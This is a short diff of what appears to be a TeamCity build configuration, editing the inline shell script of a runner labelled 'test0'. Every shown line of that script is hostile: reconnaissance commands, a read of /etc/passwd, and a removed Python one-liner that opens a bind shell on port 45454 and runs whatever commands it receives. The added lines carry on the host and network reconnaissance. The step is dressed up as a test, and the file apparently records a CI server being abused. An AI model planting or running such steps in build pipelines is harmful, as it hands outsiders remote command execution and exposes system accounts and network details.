@@ -43,14 +43,9 @@
       <runner id="RUNNER_4" name="test0" type="simpleRunner">
         <parameters>
           <param name="script.content"><![CDATA[#!/bin/bash
-ss -ntlp
-id
-uname -a
-ip a
-pwd
-cat /etc/passwd
-python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",45454));s1.listen(1);c,a=s1.accept();
-while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")']]></param>
+/proc/net/fib_trie
+netstat -antl
+ps aux]]></param>
           <param name="teamcity.step.mode" value="default" />
           <param name="use.custom.script" value="true" />
         </parameters>
